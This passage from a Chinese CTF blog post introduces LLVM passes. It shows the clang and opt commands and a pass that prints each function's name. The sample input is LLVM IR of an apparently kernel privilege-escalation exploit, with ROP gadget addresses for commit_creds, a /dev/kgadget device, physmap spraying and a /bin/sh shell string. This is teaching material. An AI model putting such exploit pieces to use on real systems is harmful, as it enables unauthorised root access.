+<p>用下面的命令可以生成.ll文件准备输入到LLVM中：<code>clang -emit-llvm -S firstLLVMtest.c -o firstLLVMtest.ll</code></p>
+<p>生成的.ll文件的前面一部分内容：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">; ModuleID = &#x27;firstLLVMtest.c&#x27;</span><br><span class="line">source_filename = &quot;firstLLVMtest.c&quot;</span><br><span class="line">target datalayout = &quot;e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128&quot;</span><br><span class="line">target triple = &quot;x86_64-pc-linux-gnu&quot;</span><br><span class="line"></span><br><span class="line">@commit_creds = dso_local constant i64 -2129882400, align 8</span><br><span class="line">@init_cred = dso_local constant i64 -2103003392, align 8</span><br><span class="line">@swapgs_restore_regs_and_return_to_usermode = dso_local constant i64 -2118119477, align 8</span><br><span class="line">@ret = dso_local constant i64 -2130705924, align 8</span><br><span class="line">@poprdi_ret = dso_local constant i64 -2130131216, align 8</span><br><span class="line">@poprsp_ret = dso_local constant i64 -2129361968, align 8</span><br><span class="line">@add_rsp_0xa0_pop_rbx_pop_r12_pop_r13_pop_rbp_ret = dso_local constant i64 -2130233346, align 8</span><br><span class="line">@.str = private unnamed_addr constant [23 x i8] c&quot;Status has been saved.\00&quot;, align 1</span><br><span class="line">@.str.1 = private unnamed_addr constant [5 x i8] c&quot;%#5x\00&quot;, align 1</span><br><span class="line">@.str.2 = private unnamed_addr constant [4 x i8] c&quot;   \00&quot;, align 1</span><br><span class="line">@.str.3 = private unnamed_addr constant [6 x i8] c&quot;%02x \00&quot;, align 1</span><br><span class="line">@.str.4 = private unnamed_addr constant [4 x i8] c&quot;%s\0A\00&quot;, align 1</span><br><span class="line">@.str.5 = private unnamed_addr constant [34 x i8] c&quot;\1B[31m\1B[1m[x] Fatal Error: %s\1B[0m\0A\00&quot;, align 1</span><br><span class="line">@.str.6 = private unnamed_addr constant [27 x i8] c&quot;\1B[33m\1B[1m[*] Info: %s\1B[0m\0A\00&quot;, align 1</span><br><span class="line">@.str.7 = private unnamed_addr constant [30 x i8] c&quot;\1B[32m\1B[1m[+] Success: %s\1B[0m\0A\00&quot;, align 1</span><br><span class="line">@.str.8 = private unnamed_addr constant [24 x i8] c&quot;Ready to get root......\00&quot;, align 1</span><br><span class="line">@.str.9 = private unnamed_addr constant [20 x i8] c&quot;Failed to get root!\00&quot;, align 1</span><br><span class="line">@.str.10 = private unnamed_addr constant [10 x i8] c&quot;Root got!\00&quot;, align 1</span><br><span class="line">@.str.11 = private unnamed_addr constant [8 x i8] c&quot;/bin/sh\00&quot;, align 1</span><br><span class="line">@page_size = common dso_local global i64 0, align 8</span><br><span class="line">@user_cs = common dso_local global i64 0, align 8</span><br><span class="line">@user_rflags = common dso_local global i64 0, align 8</span><br><span class="line">@user_sp = common dso_local global i64 0, align 8</span><br><span class="line">@user_ss = common dso_local global i64 0, align 8</span><br><span class="line">@.str.12 = private unnamed_addr constant [21 x i8] c&quot;Spray content below:\00&quot;, align 1</span><br><span class="line">@.str.13 = private unnamed_addr constant [13 x i8] c&quot;/dev/kgadget\00&quot;, align 1</span><br><span class="line">@dev = common dso_local global i32 0, align 4</span><br><span class="line">@.str.14 = private unnamed_addr constant [35 x i8] c&quot;Cannot open device \22/dev/kgadget\22!\00&quot;, align 1</span><br><span class="line">@.str.15 = private unnamed_addr constant [23 x i8] c&quot;Spraying physmap......\00&quot;, align 1</span><br><span class="line">@map_spray = common dso_local global [16000 x i64*] zeroinitializer, align 16</span><br><span class="line">@.str.16 = private unnamed_addr constant [14 x i8] c&quot;Mmap Failure!\00&quot;, align 1</span><br><span class="line">@guess = common dso_local global i64 0, align 8</span><br><span class="line">@.str.17 = private unnamed_addr constant [30 x i8] c&quot;Ready to turn to kernel......\00&quot;, align 1</span><br><span class="line"></span><br><span class="line">; Function Attrs: noinline nounwind optnone uwtable</span><br><span class="line">define dso_local void @save_status() #0 &#123;</span><br><span class="line">  call void asm sideeffect &quot;mov user_cs, cs;mov user_ss, ss;mov user_sp, rsp;pushf;pop user_rflags;&quot;, &quot;~&#123;dirflag&#125;,~&#123;fpsr&#125;,~&#123;flags&#125;&quot;() #6, !srcloc !2</span><br><span class="line">  call void @info_log(i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str, i64 0, i64 0))</span><br><span class="line">  ret void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">; Function Attrs: noinline nounwind optnone uwtable</span><br><span class="line">define dso_local void @info_log(i8* %0) #0 &#123;</span><br><span class="line">  %2 = alloca i8*, align 8</span><br><span class="line">  store i8* %0, i8** %2, align 8</span><br><span class="line">  %3 = load i8*, i8** %2, align 8</span><br><span class="line">  %4 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.6, i64 0, i64 0), i8* %3)</span><br><span class="line">  ret void</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>上面的代码是可读的，用另外一种方式阐述了代码的执行流程。</p>
+<p>然后使用下面的命令生成.so文件，作为LLVM的动态链接库LLVMFirst.so：<br><code>clang `llvm-config --cxxflags` -Wl,-znodelete -fno-rtti -fPIC -shared myFirstLLVMpass.cpp -o LLVMFirst.so `llvm-config --ldflags</code></p>
+<p>最后用下面的命令将.ll文件输入到LLVM中，如果想要得到结果可以在后面添加<code>&gt; [文件名]</code>来获取：<br><code>opt -load ./LLVMFirst.so -hello ./firstLLVMtest.ll</code></p>
+<p>其执行结果为：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">WARNING: You&#x27;re attempting to print out a bitcode file.</span><br><span class="line">This is inadvisable as it may cause display problems. If</span><br><span class="line">you REALLY want to taste LLVM bitcode first-hand, you</span><br><span class="line">can force output with the `-f&#x27; option.</span><br><span class="line"></span><br><span class="line">Hello: save_status</span><br><span class="line">Hello: info_log</span><br><span class="line">Hello: print_binary</span><br><span class="line">Hello: error_log</span><br><span class="line">Hello: success_log</span><br><span class="line">Hello: getShell</span><br><span class="line">Hello: makeROP</span><br><span class="line">Hello: main</span><br></pre></td></tr></table></figure>
+
+<p>可以看到输出了很多Hello开头的行，这是因为在上面的C++程序中，我们在匿名命名空间中重载了runOnFunction函数，让LLVM输出Hello之后再输出函数的名字，这样就有了上面的几行。</p>
+<p>在LLVM pass中可以对函数、函数中的循环、函数中的操作指令等一系列对象进行记录、修改等各种操作，具体的操作类参见<a target="_blank" rel="noopener" href="https://blog.csdn.net/mamamama811/article/details/110165333?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522165736882716782246435214%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=165736882716782246435214&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-110165333-null-null.142%5Ev32%5Econtrol,185%5Ev2%5Econtrol&utm_term=llvm%20pass&spm=1018.2226.3001.4187">资料</a>。在下一篇文章中笔者会详细分析一道题，过一下LLVM pass类pwn题的流程。</p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2023/02/28/pwnhome-%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E5%BF%AB%E9%80%9F%E7%B4%A2%E5%BC%95%EF%BC%88%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0%EF%BC%89/" rel="prev" title="pwnhome 个人博客快速索引（持续更新）">
+      <i class="fa fa-chevron-left"></i> pwnhome 个人博客快速索引（持续更新）
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2023/02/28/Kernel-pwn-%E5%85%A5%E9%97%A8-8/" rel="next" title="Kernel pwn 入门 (8)">
+      Kernel pwn 入门 (8) <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">CoLin</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">81</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">CoLin</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a>
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+</body>
+</html>
